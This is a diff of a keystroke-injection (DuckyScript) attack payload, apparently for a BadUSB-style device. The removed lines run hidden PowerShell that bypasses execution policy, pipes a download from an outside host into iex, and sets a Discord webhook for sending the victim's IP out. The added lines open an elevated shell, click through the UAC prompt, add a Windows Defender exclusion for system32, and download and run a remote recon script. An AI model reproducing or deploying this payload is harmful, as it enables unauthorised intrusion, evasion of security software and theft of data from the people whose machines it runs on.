@@ -1,13 +1,18 @@
-REM     Title: IP-Grabber
-
-REM     Author: I am Jakoby
-
-REM     Description: This payload is meant to do grab your targets IP addresses and exfil them
-
-REM     Target: Windows 10, 11
-
+REM Author: Thomas Alakopsa
+REM Description: Get IP
+REM Version: 1.0
+DELAY 500
 GUI r
 DELAY 500
-STRING powershell -w h -NoP -Ep Bypass $dc='https://discord.com/api/webhooks/1092930018310627430/r7I9qGf6fw8LjmHg3habW_H1sCvhSf3GQy5XJlujxQTfDS-F249kP8tnJulH8QpJQ6ic';$db='';irm jakoby.lol/f0x | iex
-DELAY 500000
+STRING powershell Start-Process powershell -Verb runAs
+CTRL-SHIFT ENTER
+DELAY 1500
+SHIFT TAB
+DELAY 500
+ENTER
+DELAY 1500
+STRING Add-MpPreference -ExclusionPath C:\Windows\system32
+ENTER
+DELAY 500
+STRING $dc=''; iex ((New-Object System.Net.WebClient).DownloadString('http://raw.githubusercontent.com/ThomasAlakopsa/FlipperZero/main/resources/advancedRecon.ps1'))
 ENTER
